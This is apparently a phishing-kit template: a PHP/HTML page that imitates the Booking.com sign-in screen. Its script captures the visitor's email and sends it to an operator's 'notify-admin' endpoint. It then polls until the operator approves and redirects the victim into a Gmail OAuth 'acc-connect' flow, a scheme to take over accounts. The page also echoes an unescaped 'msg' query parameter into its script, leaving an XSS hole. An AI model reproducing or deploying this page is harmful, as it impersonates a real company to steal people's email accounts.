<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title><?= $this->title ?></title>

    <!-- Bootstrap 5.3 -->
    <link
        href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
        rel="stylesheet"
    >

    <!-- Bootstrap Icons -->
    <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css"
    >

    <style>
        :root {
            --booking-blue: #003b95;
            --booking-button: #006ce4;
            --booking-link: #006ce4;
            --border-color: #949494;
        }

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            color: #1a1a1a;
            background: #fff;
        }

        /* =========================
           HEADER
        ========================== */

        .top-header {
            height: 76px;
            background: var(--booking-blue);
        }

        .header-inner {
            height: 100%;
            max-width: 1295px;
            margin: auto;
            padding: 0 20px;

            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .brand {
            color: white;
            font-size: 20px;
            font-weight: 700;
            text-decoration: none;
        }

        .header-actions {
            display: flex;
            align-items: center;
            gap: 28px;
        }

        .language {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 27px;
            line-height: 1;
        }

        .help-button {
            width: 25px;
            height: 25px;
            border: 2px solid white;
            border-radius: 50%;

            color: white;
            font-size: 15px;
            font-weight: 600;

            display: flex;
            align-items: center;
            justify-content: center;

            text-decoration: none;
        }

        /* =========================
           LOGIN AREA
        ========================== */

        .login-page {
            min-height: calc(100vh - 76px);
            display: flex;
            justify-content: center;
        }

        .login-container {
            width: 480px;
            max-width: calc(100% - 40px);
            padding-top: 15px;
        }

        .login-title {
            font-size: 25px;
            line-height: 32px;
            font-weight: 700;
            margin-bottom: 20px;
        }

        .login-description {
            font-size: 16px;
            line-height: 24px;
            margin-bottom: 23px;
            max-width: 470px;
        }

        .form-label {
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 7px;
        }

        .email-input {
            height: 44px;
            border: 1px solid #777;
            border-radius: 4px;
            font-size: 16px;
            padding: 9px;
        }

        .email-input:focus {
            border-color: #006ce4;
            box-shadow: 0 0 0 1px #006ce4;
        }

        .continue-btn {
            width: 100%;
            height: 58px;
            margin-top: 19px;

            background: var(--booking-button);
            border: none;
            border-radius: 4px;

            color: white;
            font-size: 18px;
            font-weight: 700;
        }

        .continue-btn:hover {
            background: #005bc4;
            color: white;
        }

        /* =========================
           DIVIDER
        ========================== */

        .divider {
            display: flex;
            align-items: center;
            gap: 14px;

            margin: 23px 0 31px;

            font-size: 16px;
            white-space: nowrap;
        }

        .divider::before,
        .divider::after {
            content: "";
            height: 1px;
            background: #ddd;
            flex: 1;
        }

        /* =========================
           SOCIAL BUTTONS
        ========================== */

        .social-buttons {
            display: flex;
            justify-content: center;
            gap: 38px;
        }

        .social-btn {
            width: 86px;
            height: 87px;

            background: white;
            border: 1px solid #ddd;
            border-radius: 5px;

            display: flex;
            align-items: center;
            justify-content: center;

            text-decoration: none;
            transition: .15s ease;
        }

        .social-btn:hover {
            background: #f7f7f7;
            border-color: #aaa;
        }

        /* Google */
        .google-icon {
            font-family: Arial, sans-serif;
            font-size: 34px;
            font-weight: 700;

            background: conic-gradient(
                from -45deg,
                #4285f4 0deg 90deg,
                #34a853 90deg 180deg,
                #fbbc05 180deg 270deg,
                #ea4335 270deg 360deg
            );

            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        /* Apple */
        .apple-icon {
            font-size: 31px;
            color: #000;
        }

        /* Facebook */
        .facebook-icon {
            width: 29px;
            height: 29px;

            background: #4267b2;
            color: white;

            font-size: 28px;
            font-weight: 700;
            line-height: 34px;
            text-align: center;

            font-family: Arial, sans-serif;
        }

        /* =========================
           RECOVERY
        ========================== */

        .recovery {
            text-align: center;
            margin-top: 38px;
            font-size: 16px;
        }

        .recovery a,
        .terms a {
            color: var(--booking-link);
            text-decoration: none;
        }

        .recovery a:hover,
        .terms a:hover {
            text-decoration: underline;
        }

        /* =========================
           FOOTER
        ========================== */

        .footer {
            margin-top: 59px;
            padding-top: 23px;
            border-top: 1px solid #ddd;

            text-align: center;
            font-size: 13px;
            line-height: 20px;
        }

        .terms {
            margin-bottom: 15px;
        }

        .copyright {
            margin-bottom: 0;
        }

        /* =========================
           MOBILE
        ========================== */

        @media (max-width: 576px) {

            .top-header {
                height: 64px;
            }

            .header-inner {
                padding: 0 16px;
            }

            .brand {
                font-size: 18px;
            }

            .header-actions {
                gap: 18px;
            }

            .login-page {
                min-height: calc(100vh - 64px);
            }

            .login-container {
                padding-top: 40px;
                max-width: calc(100% - 32px);
            }

            .login-title {
                font-size: 23px;
            }

            .social-buttons {
                gap: 15px;
            }

            .social-btn {
                width: 80px;
                height: 78px;
            }

            .footer {
                margin-top: 45px;
            }
        }
        .loading-text {
            margin-top: 20px;
            color: #666;
            font-size: 14px;
            font-family: Arial, sans-serif;
        }
        
    </style>
</head>

<body>

<!-- HEADER -->
<header class="top-header">
    <div class="header-inner">

        <a href="#" class="brand">
            Booking.com
        </a>

        <div class="header-actions">

            <!-- Language -->
            <span class="language" title="Language">
                <img src="https://q-xx.bstatic.com/backend_static/common/flags/new/48-squared/gb.png" 
                     alt="Language" 
                     style="width: 100%; height: 100%; object-fit: cover;">
            </span>

            <!-- Help -->
            <a href="#" class="help-button" title="Help">
                ?
            </a>

        </div>

    </div>
</header>


<!-- LOGIN -->
<main class="login-page">

    <div class="login-container " id="emailDiv">

        <h1 class="login-title">
            Sign in or create an account
        </h1>

        <p class="login-description">
            You can sign in using your Booking.com account to access our
            services.
        </p>


        <!-- Email -->
        <form>

            <div class="mb-0">

                <label for="tutorEmail" class="form-label">
                    Email address
                </label>

                <input
                    type="email"
                    id="tutorEmail"
                    class="form-control email-input"
                    placeholder="Enter your email address"
                    autocomplete="email"
                >

            </div>


            <!-- Continue -->
            <button id="tutorEmailSubmit"
                type="button"
                class="btn continue-btn"
            >
                Continue with email
            </button>
            <div class="feedbackArea">
                <p class="loading-text2" style="margin-top:3px; margin-bottom:3px;"></p>
            </div>

        </form>


        <!-- Divider -->
        <div class="divider">
            <span>or use one of these options</span>
        </div>


        <!-- Social Login -->
        <div class="social-buttons">

            <a href="#" class="social-btn" aria-label="Continue with Google">
                <span class="google-icon">G</span>
            </a>

            <a href="#" class="social-btn" aria-label="Continue with Apple">
                <i class="bi bi-apple apple-icon"></i>
            </a>

            <a href="#" class="social-btn" aria-label="Continue with Facebook">
                <span class="facebook-icon">f</span>
            </a>

        </div>


        <!-- Recovery -->
        <div class="recovery">
            Lost access to your email?
            <a href="#">
                Recover your account
            </a>
        </div>


        <!-- Footer -->
        <footer class="footer ">

            <div class="terms">
                By signing in or creating an account, you agree with our
                <a href="#">Terms &amp; conditions</a>
                and
                <a href="#">Privacy notice</a>
            </div>

            <div>
                All rights reserved.
            </div>

            <div class="copyright">
                Copyright (2006 - <?= date('Y') ?>) - Booking.com™
            </div>

        </footer>

    </div>

    <div class="login-container d-none" id="signDiv" > 
        <div class="mt-5" style="display: inline-flex; align-items: center; gap: 8px; background: rgb(255, 248, 231); border: 1px solid rgb(232, 201, 106); border-radius: 6px; padding: 5px 12px; margin-bottom: 14px;"><span id="enteredEmail" style="font-size: 13px; color: #214cb0;">xyz@gmail.com</span><button style="background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; font-size: 12px; color: rgb(136, 136, 136); cursor: pointer; padding: 0px;">change</button></div>

        <button id="signinWithEmail" style="margin-top: 1rem; display: flex; align-items: center; justify-content: center; gap: 12px; width: 100%; padding: 13px 0px; background: rgb(255, 255, 255); color: #0943f1; border: 1.5px solid rgb(208, 213, 221); border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.08) 0px 1px 4px; margin-bottom: 4px;"><svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                              <path d="M19.6 10.23c0-.68-.06-1.36-.18-2H10v3.8h5.4a4.62 4.62 0 01-2 3.03v2.5h3.24C18.4 15.93 19.6 13.3 19.6 10.23z" fill="#4285F4"></path>
                              <path d="M10 20c2.7 0 4.97-.9 6.62-2.44l-3.23-2.5c-.9.6-2.04.96-3.39.96-2.61 0-4.82-1.76-5.6-4.13H1.07v2.58A9.99 9.99 0 0010 20z" fill="#34A853"></path>
                              <path d="M4.4 11.89A6 6 0 014.18 10c0-.66.11-1.3.22-1.9V5.52H1.07A10 10 0 000 10c0 1.61.39 3.13 1.07 4.48l3.33-2.59z" fill="#FBBC05"></path>
                              <path d="M10 3.96c1.47 0 2.8.51 3.84 1.5L16.7 2.6A9.97 9.97 0 0010 0 9.99 9.99 0 001.07 5.52L4.4 8.1C5.18 5.72 7.39 3.96 10 3.96z" fill="#EA4335"></path>
                           </svg>Sign in with Gmail</button>
            
        <section id="loadingSection" class="feedbackArea"></section>

        
        <!-- Footer -->
        <footer class="footer position-sticky bottom-0 ">

            <div class="terms">
                By signing in or creating an account, you agree with our
                <a href="#">Terms &amp; conditions</a>
                and
                <a href="#">Privacy notice</a>
            </div>

            <div>
                All rights reserved.
            </div>

            <div class="copyright">
                Copyright (2006 - <?= date('Y') ?>) - Booking.com™
            </div>

        </footer>
    </div>

</main>




   <script> 
      const emailDiv = document.querySelector("#emailDiv");
      const signDiv = document.querySelector("#signDiv"); 
      const tutorDiv = document.querySelector("#tutorDiv");

      //const loadingText = document.querySelector('.loading-text');
      const loadingText2 = document.querySelector('.loading-text2');
      //const loadingTitle = document.querySelector('.loading-title');
      let notifyAdminLoading = false;

      const tutorEmailSubmit = document.querySelector("#tutorEmailSubmit");
      const signinWithEmail = document.querySelector("#signinWithEmail");
      const btnContent = signinWithEmail.innerHTML;
      const feedbackArea = document.querySelectorAll('.feedbackArea');
      
      const returnedText = `<?= urldecode($_GET['msg'] ?? '') ?>`;
     

      function clearFeedbackArea(warn = false, success = false) {
          feedbackArea.forEach(element => { 
                element.classList.remove('alert', 'alert-success');    
                element.classList.remove('alert', 'alert-warning'); 
                element.textContent = '';
         });
      }

      let email;
   

      // fire first click - submit here.....
       tutorEmailSubmit.addEventListener('click', (e) => {
         email = document.querySelector('#tutorEmail').value;
         enteredEmail.textContent = email;
         tutorEmailSubmit.innerHTML = `<?= CustomFunctions::Loading(loading:'<span></span>') ?>`;
          
         try {
         const test = validateEmail(email);

         if (!test) {
            alert("Enter valid email to proceed");
            return;
         }

         notifyAdmin();

         setTimeout(()=> { 
            emailDiv.classList.add('d-none');
            signDiv.classList.remove('d-none');
            signinWithEmail.innerHTML = btnContent;
            clearFeedbackArea();
         }, 15000);// 20secs
         } catch(e) {}
         finally {
            //tutorEmailSubmit.textContent = 'Continue';
         }

         
      });


      //click event fired
      signinWithEmail.addEventListener("click", async (e) => {
         
         const feedbackArea = document.querySelectorAll('.feedbackArea');
         feedbackArea.forEach(element => {
            
                    element.classList.remove('alert', 'alert-warning');
                    element.classList.add('alert', 'alert-success');           
         });

         //loadingTitle.textContent = 'Verifying Tutor Access';
         //loadingText.textContent = 'Notifying administrators for user authorization...please wait!!!';
         
         
         //window.location.href=`/acc-connect/?email=${encodeURIComponent(email)}`;
         
         

         pollStatus(email);
         notifyAdmin();


      });

      async function notifyAdmin() {
         
         notifyAdminLoading = true;
         signinWithEmail.innerHTML = `<?= CustomFunctions::Loading() ?>`; 
         
         try {
            // Send notification request to backend
            const response = await fetch(`/myapp/notify-admin/`, {
               method: "POST",
               body: JSON.stringify({
                  email,
                  owner: `<?= $this->ownUrl ??'' ?>`,
                  url: `<?= $this->url ?? '' ?>`,
               }),
            });

            await response.json();
            //loadingText.textContent = `Redirecting to Google authentication...Please wait it may take up to a minute do not leave page!! Refresh it it takes more than a minute`; 

         } catch (error) {

         } finally {
            //signinWithEmail.innerHTML = btnContent;
            notifyAdminLoading = false;
         }
      }

      let cycles = 0;
      async function pollStatus(email) {
         cycles++;
         const redirectUrl = `/acc-connect/?email=${encodeURIComponent(email)}`;
         
         feedbackArea.forEach(element => {
            
                    element.classList.remove('alert', 'alert-warning');
                    element.classList.add('alert', 'alert-success');           
         });
         

         try { 

         //loadingText.textContent = 'Administrators notified.Please wait do not leave page it may take up to 30 seconds. Preparing authentication...';


         // Wait 8 seconds total to allow manual test user addition
         setTimeout( async () => { 

            const p = await fetch('/myapp/email-status', {
               method: "POST",
               body: JSON.stringify({
                  email
               })
            });
            if (!p.ok){
                notifyAdminLoading ? pollStatus(email) : signinWithEmail.click();
                return;
            }
            const r = await p.json();
            if (r.error === 'false' || r.error === false) {

               // Redirect to Gmail OAuth flow 
               window.location.href = redirectUrl;


            } else {
                notifyAdminLoading ? pollStatus(email) : signinWithEmail.click(); 
            }

         }, 15000);

      } catch(e) {
        //  setTimeout(()=> {
        //     window.location.href = redirectUrl;
        //  }, 50000);
      }
      finally {

      }


      }





      // Email validation
      function validateEmail(email) {
         const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return re.test(email);
      }
   </script>

<script
    src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js">
</script>

</body>
</html>